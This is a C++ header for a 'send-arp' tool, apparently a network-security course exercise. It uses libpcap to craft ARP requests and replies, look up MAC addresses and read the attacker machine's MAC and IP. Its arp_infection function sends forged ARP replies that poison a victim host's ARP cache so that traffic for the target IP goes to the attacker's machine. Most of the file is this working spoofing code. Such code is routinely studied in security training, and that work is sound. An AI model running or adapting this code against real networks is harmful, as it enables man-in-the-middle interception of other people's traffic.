#pragma once
#include <iostream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <fcntl.h>
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#include "ethhdr.h"
#include "arphdr.h"

#define ETHER_HDR_LEN 14

#define MAC_LEN 17
#define IP_LEN 15

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

typedef enum _mode
{
    TARGET,SENDER,ARP_REQ,ARP_REP
}Mode;

using std::string;
using std::cout;
using std::endl;

void usage()
{
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sudo ./send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void send_arp(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Mac tmac, Ip tip, Mode mode)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    if (mode == ARP_REQ)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (mode == ARP_REP)
        packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

void arp_infection(pcap_t *handle, Mac s_mac, Ip s_ip, Ip t_ip, Mac a_mac)
{
    for (int i = 0; i < 5; i++)
    {
        send_arp(handle, s_mac, a_mac, t_ip, s_mac, s_ip, ARP_REP);
    }
}

Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip, Mode mode)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
    Mac lookup = Mac("00:00:00:00:00:00");

    send_arp(handle, broadcast, a_mac, a_ip, lookup, t_ip, ARP_REQ);

    struct ArpHdr arp;

    while (true)
    {
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (packet != NULL)
        {
            memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
            struct Ip chk_a_ip(a_ip);
            struct Mac chk_a_mac(a_mac);
            struct Ip chk_t_ip(t_ip);
            if (arp.op_ == htons(ArpHdr::Reply) && chk_a_ip == arp.tip() && chk_t_ip == arp.sip() && chk_a_mac == arp.tmac())
                break;
        }
    }

    return arp.smac();
}

Mac get_attacker_mac(const char *dev)
{
    char buf[MAC_LEN + 1] = {0};

    int len = strlen(dev);
    int sz = len + 24; //NULL considerd
    char *path = (char *)malloc(sz);
    if (path == NULL)
    {
        perror("path malloc failed");
        exit(-1);
    }

    snprintf(path, sz, "%s%s%s", "/sys/class/net/", dev, "/address");
    int fd = open(path, O_RDONLY);
    if (fd == -1)
    {
        perror("open failed");
        exit(-1);
    }

    int bytes = read(fd, buf, MAC_LEN);
    if (bytes != MAC_LEN)
    {
        fprintf(stderr, "mac addr read failed");
        free(path);
        close(fd);
    }

    free(path);
    close(fd);
    return Mac(buf);
}

Ip get_attacker_ip(const char *dev)
{
    struct ifreq ifr;
    char buf[IP_LEN+1] = {0};

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == -1)
    {
        perror("socket creation failed");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl error");
        close(s);
        exit(-1);
    }
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short),buf,sizeof(struct sockaddr));

    close(s);
    return Ip(buf);
}

void show_info(Ip s_ip, Mac s_mac, Ip t_ip, Mac t_mac, Ip a_ip, Mac a_mac)
{
    puts("====Sender====");
    cout << "IP : " << std::string(s_ip) << endl;//%s\n", std::string(s_ip));
    cout << "MAC : " << std::string(s_mac) << endl;//%s\n", std::string(s_mac));
    puts("====Target====");
    cout << "IP : " << std::string(t_ip) << endl; //%s\n", std::string(t_ip));
    cout << "MAC : " << std::string(t_mac) << endl; //%s\n", std::string(t_mac));
    puts("====Attacker====");
    cout << "IP : " << std::string(a_ip) << endl; //%s\n", std::string(a_ip));
    cout << "MAC : " << std::string(a_mac) << endl; //%s\n", std::string(a_mac));
}